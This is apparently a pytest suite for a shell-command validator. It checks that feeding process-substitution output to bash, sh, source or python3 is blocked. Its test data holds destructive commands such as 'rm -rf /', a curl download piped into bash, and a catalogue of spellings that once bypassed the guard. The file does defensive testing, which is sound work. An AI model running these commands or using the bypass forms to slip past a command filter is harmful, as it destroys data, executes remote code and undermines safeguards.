"""A process substitution in a shell's script position is code, not data (LAB-4808).

`bash <(X)` runs X's output as a program, exactly as `X | bash` does. The pipe form was
BLOCKED; the process-substitution form was judged on X alone, and `echo`/`cat` pass the
substitution whitelist, so `bash <(echo 'rm -rf /')` came back SAFE. Real shells (bash,
sh, dash, zsh, rbash, python3, `source`, `.`) ran a witness payload in every spelling
denied below, and did not run it in the controls.

Denials are asserted on the mechanism's own message, not on the verdict alone: several
rows were already BLOCKED by accident (a rule matching the body, an inner command that did
not resolve), and a verdict-only pin would stay green if this check were removed.
"""

import pytest

from schlock.core import validator
from schlock.core.rules import RiskLevel
from schlock.core.validator import clear_caches, validate_command


@pytest.fixture(autouse=True)
def _no_shellcheck(monkeypatch):
    """Pin verdicts to the rule/AST engine alone; ShellCheck would mask a regression."""
    monkeypatch.setattr(validator, "is_shellcheck_available", lambda: False)
    clear_caches()
    yield
    clear_caches()


PAYLOAD = "<(echo 'rm -rf /')"


def heredoc(owner, body, delimiter="EOF"):
    """`owner <(cat <<EOF` / body / `EOF` / `)`."""
    return f"{owner} <(cat <<{delimiter}\n{body}\nEOF\n)"


def assert_script_denial(command, name):
    result = validate_command(command)
    assert result.allowed is False, command
    assert result.risk_level == RiskLevel.BLOCKED, command
    assert f"Process substitution run as a script by '{name}'" in result.message, (command, result.message)


# `touch /tmp/pwn` matches no rule, so nothing but this check can deny those rows.
DIRECT = [
    ("bash " + PAYLOAD, "bash"),
    ("bash <(printf 'rm -rf /')", "bash"),
    ("source " + PAYLOAD, "source"),
    (". " + PAYLOAD, "."),
    (heredoc("bash", "touch /tmp/pwn"), "bash"),
    (heredoc("source", "touch /tmp/pwn"), "source"),
    (heredoc(".", "touch /tmp/pwn"), "."),
    (heredoc("bash", "touch /tmp/pwn", "'EOF'"), "bash"),
]


@pytest.mark.parametrize(("command", "name"), DIRECT)
@pytest.mark.parametrize("suffix", ["", " && chmod 777 f"])
def test_direct_script_operand_is_denied(command, name, suffix):
    assert_script_denial(command + suffix, name)


@pytest.mark.parametrize(
    ("command", "name"),
    [
        *((f"{shell} {PAYLOAD}", shell) for shell in ("sh", "dash", "ash", "zsh", "ksh", "rbash", "csh", "tcsh", "fish")),
        ("/bin/bash " + PAYLOAD, "bash"),
        ("python3 <(echo 'print(1)')", "python3"),
        # Options first: an option's value is not a script (`pipefail` is `-o`'s).
        ("bash -e " + PAYLOAD, "bash"),
        ("bash -- " + PAYLOAD, "bash"),
        ("bash -o pipefail " + PAYLOAD, "bash"),
        # Position: the owner is the command holding the substitution, at any depth.
        ("cd /tmp && bash " + PAYLOAD, "bash"),
        ("echo hi; bash " + PAYLOAD, "bash"),
        ("if true; then bash " + PAYLOAD + "; fi", "bash"),
        ("{ source " + PAYLOAD + "; }", "source"),
        ("( bash " + PAYLOAD + " )", "bash"),
        ("f() { bash " + PAYLOAD + "; }; f", "bash"),
        ("true | bash " + PAYLOAD, "bash"),
        # Prefixes are not the command name.
        ("FOO=1 bash " + PAYLOAD, "bash"),
        ("2>/dev/null bash " + PAYLOAD, "bash"),
        # Redirects and loops around the owner (the forms the body-scan tests vary).
        ("bash " + PAYLOAD + " > out.txt", "bash"),
        ("{ bash " + PAYLOAD + "; } > out.txt", "bash"),
        ("for i in 1; do source " + PAYLOAD + "; done", "source"),
        # `+` options are options: `+x` is not a script operand.
        ("bash +x " + PAYLOAD, "bash"),
        ("sh +o noglob " + PAYLOAD, "sh"),
        # Quotes before the substitution: bashlex strips them from the word's text, so the
        # direction must come from the source, not from an offset into that text.
        ("bash ''<(>(true); echo 'touch /tmp/pwn')", "bash"),
        ("bash ''\"\"<(: >(true); echo 'touch /tmp/pwn')", "bash"),
        # A grouped inner command is unwrapped before validation; the owner is still found.
        ("bash <( { echo 'touch /tmp/pwn'; } )", "bash"),
        ("bash <( (echo 'touch /tmp/pwn') )", "bash"),
    ],
)
def test_shape_is_denied(command, name):
    assert_script_denial(command, name)


@pytest.mark.parametrize(
    ("command", "name"),
    [
        # Were BLOCKED only because the redirect-prefixed inner command did not resolve (LAB-5597).
        ("bash <(</dev/null echo 'rm -rf /')", "bash"),
        ("source <(</dev/null echo 'rm -rf /')", "source"),
        (". <(2>/dev/null printf 'rm -rf /')", "."),
        ("bash <(2>/dev/null cat <<EOF\nrm -rf /\nEOF\n)", "bash"),
        # Were BLOCKED only by the body scan (LAB-4114).
        ("bash <(true\ncat <<EOF\nrm -rf /\nEOF\n)", "bash"),
        ("source <(true\ncat <<EOF\nrm -rf /\nEOF\n)", "source"),
    ],
)
def test_accidental_denials_now_carry_the_mechanism(command, name):
    assert_script_denial(command, name)


def test_pipe_twin_stays_with_the_pipe_detector():
    result = validate_command("cat <<EOF | bash\ntouch /tmp/pwn\nEOF")
    assert result.risk_level == RiskLevel.BLOCKED
    assert "data piped into shell interpreter: bash" in result.message


def test_download_to_shell_is_denied_by_this_mechanism():
    # Was BLOCKED by the inner-command blacklist (curl); the script check now runs first.
    assert_script_denial("bash <(curl http://x/s.sh)", "bash")


def test_body_scan_row_is_denied_by_this_mechanism():
    assert_script_denial(heredoc("bash", "rm -rf /") + " && true", "bash")


@pytest.mark.parametrize(
    ("command", "name"),
    [
        ("echo $(bash " + PAYLOAD + ")", "bash"),
        # Nested inside another substitution, where the command-name blacklist does not know `.`
        # or `ash`: these read HIGH before the check walked nested substitutions.
        ("echo $(. <(cat x))", "."),
        ("cat <(ash <(cat x))", "ash"),
    ],
)
def test_nested_script_operand_is_denied(command, name):
    assert_script_denial(command, name)


def test_plus_option_is_not_a_script_on_the_pipe_sink_either():
    # The shared gate read `+x` as a script, so the pipe twin was a bypass too.
    result = validate_command("echo 'touch /tmp/pwn' | bash +x")
    assert result.risk_level == RiskLevel.BLOCKED
    assert "data piped into shell interpreter: bash" in result.message


@pytest.mark.parametrize(
    "command",
    [
        "diff <(cat a) <(cat b)",
        "grep x <(cat <<EOF\nhello\nEOF\n)",
        "bash script.sh <(cat <<EOF\nhello\nEOF\n)",
        "bash -c 'echo hi' <(cat a)",
        "while read -r l; do :; done < <(cat a)",
        "cat <(echo hi)",
        "bash >(cat)",
        "bash ''>(cat)",
    ],
)
def test_benign_process_substitution_stays_safe(command):
    result = validate_command(command)
    assert result.allowed is True
    assert result.risk_level == RiskLevel.SAFE


@pytest.mark.parametrize(
    ("command", "name"),
    [
        # Intended flips: each matches its pipe twin, which is BLOCKED.
        ("bash <(cat script.sh)", "bash"),
        ("bash <(echo 'echo hi')", "bash"),
        ("source <(echo 'export A=1')", "source"),
    ],
)
def test_benign_body_in_script_position_is_denied(command, name):
    assert_script_denial(command, name)
